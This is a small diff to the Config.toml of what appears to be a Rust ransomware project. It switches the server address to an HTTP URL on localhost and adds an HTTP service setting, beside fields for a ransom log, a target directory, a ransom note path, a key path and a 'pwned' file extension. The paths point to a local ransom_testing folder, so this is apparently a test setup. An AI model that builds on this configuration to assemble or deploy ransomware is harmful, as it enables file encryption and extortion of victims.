@@ -1,5 +1,5 @@
 # Config.toml
-server_address = "127.0.0.1:6969"
+server_address = "http://127.0.0.1:6969"
 log_path = "files/ransom_log.txt"
 target_path = "/Users/wolf/dev/rust_projects/ransom_testing"
 note_path = "/Users/wolf/dev/rust_projects/ransom_testing"
@@ -7,3 +7,4 @@ key_path = "/Users/wolf/dev/rust_projects/ransom_testing"
 extension = "pwned"
 retries = 3
 timeout_seconds = 10
+service = "HTTP"
